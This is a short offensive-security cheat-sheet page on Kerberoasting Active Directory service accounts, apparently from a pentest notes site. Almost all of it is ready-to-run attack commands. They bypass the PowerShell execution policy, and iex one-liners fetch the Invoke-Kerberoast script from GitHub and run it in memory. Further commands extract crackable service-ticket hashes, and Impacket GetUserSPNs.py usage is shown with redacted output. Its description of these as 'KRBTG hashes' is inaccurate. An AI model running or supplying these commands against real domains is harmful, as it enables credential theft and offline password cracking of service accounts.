---
title : "Kerberoasting"
# pre : ' '
description : "Abusing the kerberos protocol to gain KRBTG hashes to crack."
date : 2020-07-08T09:50:07+02:00
# hidden : true
# draft : true
weight : 30
# tags : ['']
---

---

Abusing the kerberos protocol to gain KRBTG hashes to crack.

### Powershell

```powershell
Set-ExecutionPolicy -scope process -execution bypass
```

```powershell
iex((iwr https://raw.githubusercontent.com/justin-p/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1).content);invoke-kerberoast -outputformat Hashcat | export-csv C:\temp\kerb_tickets.csv
```

One liner to extract hashcat ready hashes from `kerb_tickets.csv`.

```plain
cat kerb_tickets.csv | awk '{print $1}' | sed 's/"//g' | cut -d ',' -f2 > kerbs
```

Other method:

```powershell
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
```

On SSL/TLS error:

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
```

### GetUserSPNs.py - Impacket

```plain
$ GetUserSPNs.py -target-domain offsec.nl -request -outputfile out.log -dc-ip 10.10.10.10 offsec.nl/normal-user
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

Password:
ServicePrincipalName               Name               MemberOf                                                              PasswordLastSet             LastLogon                   Delegation
---------------------------------  -----------------  --------------------------------------------------------------------  --------------------------  --------------------------  ----------
SRV2016-DC/DC01.offsec.nl         DC01 [REDACTED]

$ cat out.log
$krb5tgs$23$*[REDACTED]
```
